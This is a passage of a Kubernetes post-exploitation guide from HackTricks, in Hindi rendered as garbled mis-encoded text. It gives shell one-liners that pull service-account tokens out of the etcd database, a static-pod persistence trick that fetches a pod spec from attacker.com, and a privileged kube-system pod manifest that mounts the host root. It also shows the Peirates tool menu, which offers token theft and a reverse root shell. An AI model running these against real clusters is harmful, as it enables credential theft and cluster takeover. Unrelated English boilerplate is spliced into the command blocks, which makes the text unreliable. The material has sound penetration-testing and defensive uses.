рдЬрд┐рд╕реЗ рдЖрдк рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдЙрддреНрдкрд╛рдж рдХрд╛ рдЙрдкрдпреЛрдЧ рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдореЗрдВ рдмрддрд╛рдП рдЧрдП рддрд░реАрдХреЗ рдХреЗ рд╕рдорд╛рди рд╣реИ, рд▓реЗрдХрд┐рди рдЕрдм рдЖрдкрдХреЛ рднрд╛рдЧреНрдп рдкрд░ рдирд┐рд░реНрднрд░ рдирд╣реАрдВ рд╣реЛрдирд╛ рд╣реИред

### рдХреНрд▓рд╛рдЙрдб рдореЗрдВ рдкрд┐рд╡рдЯ

рдпрджрд┐ рдХреНрд▓рд╕реНрдЯрд░ рдХреЛ рдПрдХ рдХреНрд▓рд╛рдЙрдб рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╕рд╛рдорд╛рдиреНрдпрддрдГ **рдиреЛрдб рдХреЛ рдкреЙрдб рд╕реЗ рдЕрд▓рдЧ рд░реВрдк рд╕реЗ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрдЧреА**ред рдЗрд╕рд▓рд┐рдП, рдиреЛрдб рд╕реЗ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдХрд╛ рдкрд╣реБрдВрдЪ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ (рдпрд╛ hostNetwork рдХреЛ True рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкреЙрдб рд╕реЗ):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### etcd рдЪреБрд░рд╛рдПрдВ

рдпрджрд┐ рдЖрдк рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓реЗ рдиреЛрдб рдХрд╛ [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдПрдХ рдХрдВрдЯреНрд░реЛрд▓-рдкреНрд▓реЗрди рдиреЛрдб рдореЗрдВ рдПрдХ рд╢реИрд▓ рдорд┐рд▓рд╛рдПрдВ рдФрд░ **etcd рдбреЗрдЯрд╛рдмреЗрд╕** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-plane рдиреЛрдбреНрд╕ рдореЗрдВ **рдорд╛рд╕реНрдЯрд░ рд░реЛрд▓** рд╣реЛрддреА рд╣реИ рдФрд░ **рдХреНрд▓рд╛рдЙрдб рдореИрдиреЗрдЬреНрдб рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рдЖрдк рдЙрдирдореЗрдВ рдХреБрдЫ рднреА рдЪрд▓рд╛ рдирд╣реАрдВ рд╕рдХрддреЗ**ред

#### etcd рд╕реЗ рд╕реАрдХреНрд░реЗрдЯ рдкрдврд╝реЗрдВ

рдпрджрд┐ рдЖрдк `nodeName` рд╕реЗрд▓реЗрдХреНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рдкреЙрдб рдХреЛ рдХрдВрдЯреНрд░реЛрд▓-рдкреНрд▓реЗрди рдиреЛрдб рдкрд░ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ `etcd` рдбреЗрдЯрд╛рдмреЗрд╕ рддрдХ рдЖрд╕рд╛рди рдкрд╣реБрдВрдЪ рд╣реЛ рд╕рдХрддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рд╕рднреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди, рд╕рд╣рд┐рдд рд╕рднреА рд╕реАрдХреНрд░реЗрдЯреНрд╕ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВред

рдиреАрдЪреЗ рдПрдХ рддреНрд╡рд░рд┐рдд рдФрд░ рдЕрд╕реНрдкрд╖реНрдЯ рддрд░реАрдХрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк `etcd` рд╕реЗ рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрджрд┐ рдпрд╣ рдЖрдкрдХреЗ рдХрдВрдЯреНрд░реЛрд▓-рдкреНрд▓реЗрди рдиреЛрдб рдкрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИред рдпрджрд┐ рдЖрдк рдПрдХ рдФрд░ рд╕реБрдВрджрд░ рд╕рдорд╛рдзрд╛рди рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЬреЛ `etcdctl` рдирд╛рдордХ `etcd` рдХреНрд▓рд╛рдЗрдВрдЯ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкреЙрдб рдХреЛ рдЙрдард╛рддрд╛ рд╣реИ рдФрд░ рдЬрд╣рд╛рдВ рднреА рдпрд╣ рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рдЙрд╕рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рдХрдВрдЯреНрд░реЛрд▓-рдкреНрд▓реЗрди рдиреЛрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддреЛ @mauilion рдХреЗ [рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдирд┐рдлреЗрд╕реНрдЯ](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред

**рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХрдВрдЯреНрд░реЛрд▓-рдкреНрд▓реЗрди рдиреЛрдб рдкрд░ `etcd` рдЪрд▓ рд░рд╣рд╛ рд╣реИ рдФрд░ рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╣рд╛рдВ рд╣реИ (рдпрд╣ `kubeadm` рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЧрдП рдХреНрд▓рд╕реНрдЯрд░ рдкрд░ рд╣реИ)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
# Attacking Kubernetes from Inside a Pod

## Introduction

In this section, we will discuss various techniques to attack a Kubernetes cluster from inside a pod. These techniques can be used by an attacker who has gained access to a pod within the cluster.

## 1. Exploiting Misconfigurations

### 1.1. Accessing the Kubernetes API Server

If the pod has access to the Kubernetes API server, an attacker can use this access to perform various actions, such as creating or deleting pods, services, or secrets. The attacker can also retrieve sensitive information, such as credentials or configuration files.

### 1.2. Accessing Other Pods

If the pod has access to the network namespace of other pods within the cluster, an attacker can use this access to perform lateral movement and attack other pods. This can be done by exploiting vulnerabilities in the applications running on the other pods or by leveraging misconfigurations.

## 2. Privilege Escalation

### 2.1. Exploiting Vulnerabilities

If the pod has privileges to run as a privileged user or has access to privileged containers, an attacker can exploit vulnerabilities in the underlying operating system or container runtime to escalate their privileges. This can allow the attacker to gain root access to the host machine or perform other malicious actions.

### 2.2. Exploiting Service Accounts

If the pod has access to service account tokens, an attacker can use these tokens to authenticate with the Kubernetes API server and perform actions on behalf of the compromised pod. This can allow the attacker to escalate their privileges and gain access to sensitive resources within the cluster.

## 3. Data Exfiltration

### 3.1. Accessing Sensitive Data

If the pod has access to sensitive data, such as secrets or configuration files, an attacker can exfiltrate this data by copying it to a location accessible to them. This can be done by leveraging file system permissions or by exploiting vulnerabilities in the applications running on the pod.

### 3.2. Network-based Data Exfiltration

If the pod has network connectivity, an attacker can exfiltrate data by sending it to an external server controlled by them. This can be done by leveraging network protocols or by exploiting vulnerabilities in the applications running on the pod.

## Conclusion

In this section, we have discussed various techniques that an attacker can use to attack a Kubernetes cluster from inside a pod. It is important for administrators to be aware of these techniques and implement appropriate security measures to protect their clusters.
```bash
data-dir=/var/lib/etcd
```
**рдИрдЯреАрд╕реАрдбреА рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдбреЗрдЯрд╛ рджреЗрдЦреЗрдВ:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдЯреЛрдХрди рдирд┐рдХрд╛рд▓реЗрдВ рдФрд░ рд╕рд░реНрд╡рд┐рд╕ рдЕрдХрд╛рдЙрдВрдЯ рдХрд╛ рдирд╛рдо рджрд┐рдЦрд╛рдПрдВ**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**рд╡рд╣реА рдХрдорд╛рдВрдб, рд▓реЗрдХрд┐рди рдХреБрдЫ greps рдХреЗрд╡рд▓ kube-system рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЯреЛрдХрди рд▓реМрдЯрд╛рдиреЗ рдХреЗ рд▓рд┐рдП**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
# Attacking Kubernetes from Inside a Pod

## Introduction

In this section, we will discuss various techniques to attack a Kubernetes cluster from inside a pod. These techniques can be used by an attacker who has gained access to a pod within the cluster.

## 1. Exploiting Misconfigurations

### 1.1. Accessing the Kubernetes API Server

If the pod has access to the Kubernetes API server, an attacker can use this access to perform various actions, such as creating or deleting pods, services, or secrets. The attacker can also retrieve sensitive information, such as credentials or configuration files.

### 1.2. Accessing Other Pods

If the pod has access to the network namespace of other pods within the cluster, an attacker can use this access to perform lateral movement and attack other pods. The attacker can also exfiltrate data from other pods or perform privilege escalation attacks.

## 2. Exploiting Vulnerabilities

### 2.1. Exploiting Container Vulnerabilities

If the pod is running a vulnerable container image, an attacker can exploit these vulnerabilities to gain unauthorized access to the pod or the underlying host. The attacker can then use this access to further compromise the cluster.

### 2.2. Exploiting Kubernetes Vulnerabilities

If the Kubernetes version running in the cluster has known vulnerabilities, an attacker can exploit these vulnerabilities to gain unauthorized access to the cluster. The attacker can then perform various actions, such as creating or deleting pods, services, or secrets.

## Conclusion

In this section, we have discussed various techniques that an attacker can use to attack a Kubernetes cluster from inside a pod. It is important for administrators to be aware of these techniques and take appropriate measures to secure their clusters.
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### рд╕реНрдерд╛рдпреА/рдорд┐рд░рд░ рдкреЙрдб рд╕реНрдерд╛рдпрд┐рддреНрд╡

_рд╕реНрдерд╛рдпреА рдкреЙрдб_ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдиреЛрдб рдкрд░ kubelet рдбреЗрдорди рджреНрд╡рд╛рд░рд╛ рд╕реАрдзреЗ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЬрд┐рдиреНрд╣реЗрдВ API рд╕рд░реНрд╡рд░ рдирд╣реАрдВ рджреЗрдЦрддрд╛ рд╣реИред рдЗрдирдХреЗ рдмрдЬрд╛рдп, **kubelet рдкреНрд░рддреНрдпреЗрдХ рд╕реНрдерд╛рдпреА рдкреЙрдб рдХрд╛ рдирд┐рдЧрд░рд╛рдиреА рдХрд░рддрд╛ рд╣реИ** (рдФрд░ рдпрджрд┐ рдпрд╣ рд╡рд┐рдлрд▓ рд╣реЛрддрд╛ рд╣реИ рддреЛ рдЗрд╕реЗ рдкреБрдирдГ рдЪрд╛рд▓реВ рдХрд░рддрд╛ рд╣реИ)ред

рдЗрд╕рд▓рд┐рдП, рд╕реНрдерд╛рдпреА рдкреЙрдб рд╣рдореЗрд╢рд╛ рдПрдХ рдирд┐рд╢реНрдЪрд┐рдд рдиреЛрдб рдкрд░ рдПрдХ Kubelet рд╕реЗ рдмрдВрдзреЗ рд╣реЛрддреЗ рд╣реИрдВред

**kubelet рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рд╕реНрдерд╛рдпреА рдкреЙрдб рдХреЗ рд▓рд┐рдП Kubernetes API рд╕рд░реНрд╡рд░ рдкрд░ рдПрдХ рдорд┐рд░рд░ рдкреЙрдб рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдиреЛрдб рдкрд░ рдЪрд▓ рд░рд╣реЗ рдкреЙрдб API рд╕рд░реНрд╡рд░ рдкрд░ рджрд┐рдЦрд╛рдИ рджреЗрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рд╡рд╣рд╛рдВ рд╕реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдкреЙрдб рдирд╛рдореЛрдВ рдХреЗ рдЖрдЧреЗ рдиреЛрдб рд╣реЛрд╕реНрдЯрдирд╛рдо рдХреЗ рд╕рд╛рде рдПрдХ рд╢реБрд░реБрдЖрддреА рд╣рд╛рдЗрдлрд╝рди рдХреЗ рд╕рд╛рде рд╕рдВрд▓рдЧреНрди рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

{% hint style="danger" %}
рд╕реНрдерд╛рдпреА рдкреЙрдб рдХреА **`spec` рдЕрдиреНрдп API рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ рд╕рдВрджрд░реНрдн рдирд╣реАрдВ рдХрд░ рд╕рдХрддреА** (рдЬреИрд╕реЗ рдХрд┐ ServiceAccount, ConfigMap, Secret, рдЖрджрд┐)ред рдЗрд╕рд▓рд┐рдП **рдЖрдк рд╡рд░реНрддрдорд╛рди рдиреЛрдб рдореЗрдВ рдХрд┐рд╕реА рднреА рд╡рд┐рдЪрд┐рддреНрд░ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рдкреЙрдб рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ**ред рд▓реЗрдХрд┐рди рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рдкреЙрдб рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдг рд╕реЗ рдпрд╣ рдЙрдкрдпреЛрдЧреА рд╣реЛ)ред
{% endhint %}

рдпрджрд┐ рдЖрдк рдиреЛрдб рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕реЗ рдПрдХ **рд╕реНрдерд╛рдпреА рдкреЙрдб рдмрдирд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЖрдкрдХреЛ **kube-system** рдЬреИрд╕реЗ рдПрдХ рдЕрд▓рдЧ рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рдкреЙрдб рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред

рд╕реНрдерд╛рдпреА рдкреЙрдб рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, [**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реА рдорджрдж рдмрд╣реБрдд рд╕рд╣рд╛рдпрдХ рд╣реИрдВ**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)ред рдЖрдкрдХреЛ рдореВрд▓ рд░реВрдк рд╕реЗ 2 рдЪреАрдЬреЗрдВ рдЪрд╛рд╣рд┐рдП:

* **kubelet рд╕реЗрд╡рд╛** рдореЗрдВ **`--pod-manifest-path=/etc/kubernetes/manifests`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ, рдпрд╛ **kubelet рдХреЙрдиреНрдлрд╝рд┐рдЧ** рдореЗрдВ ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) рдФрд░ рд╕реЗрд╡рд╛ рдХреЛ рдкреБрдирдГ рдЪрд╛рд▓реВ рдХрд░реЗрдВ
* **`/etc/kubernetes/manifests`** рдореЗрдВ **рдкреЙрдб рдкрд░рд┐рднрд╛рд╖рд╛** рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд╛ рдмрдирд╛рдПрдВ

**рдПрдХ рдФрд░ рдЕрдзрд┐рдХ рдЫрд┐рдкреА рд╣реБрдИ рддрд░реАрдХрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:**

* **kubelet** рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рд╕реЗ **`staticPodURL`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ рдФрд░ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рд╕реЗрдЯ рдХрд░реЗрдВ `staticPodURL: http://attacker.com:8765/pod.yaml`ред рдЗрд╕рд╕реЗ kubelet рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдПрдХ **рд╕реНрдерд╛рдпреА рдкреЙрдб** рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ рдФрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ URL рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ред

**рдЙрджрд╛рд╣рд░рдг** рдХрд╛ **рдкреЙрдб** рд╡рд┐рдиреНрдпрд╛рд╕ рдЬреЛ **kube-system** рдореЗрдВ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреЙрдб рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ, [**рдпрд╣рд╛рдВ рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### рдкреЙрдбреНрд╕ рдХреЛ рд╣рдЯрд╛рдПрдВ + рдЕрдиреБрд╕реВрдЪреАрдд рдиреЛрдбреНрд╕

рдпрджрд┐ рдХреЛрдИ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдиреЛрдб рдХреЛ **рдХрдВрдкреНрд░рдорд╛рдЗрдЬрд╝** рдХрд░ рдЪреБрдХрд╛ рд╣реИ рдФрд░ рд╡рд╣ рдЕрдиреНрдп рдиреЛрдбреЛрдВ рд╕реЗ **рдкреЙрдбреНрд╕ рдХреЛ рд╣рдЯрд╛ рд╕рдХрддрд╛ рд╣реИ** рдФрд░ рдЕрдиреНрдп рдиреЛрдбреНрд╕ рдХреЛ **рдкреЙрдбреНрд╕ рдХреЛ рдирд╣реАрдВ рдЪрд▓рд╛ рд╕рдХрддреЗ** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдкреЙрдбреНрд╕ рдХреЛ рдХрдВрдкреНрд░рдорд╛рдЗрдЬрд╝ рдиреЛрдб рдореЗрдВ рджреЛрдмрд╛рд░рд╛ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рд╡рд╣ рдкреЙрдбреНрд╕ рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рдЯреЛрдХрдиреНрд╕ рдХреЛ **рдЪреБрд░рд╛ рд╕рдХреЗрдЧрд╛**ред\
[**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЗрд╕ рд▓рд┐рдВрдХ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
<details>

<summary><strong>рдмрдврд╝рд┐рдпрд╛ рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
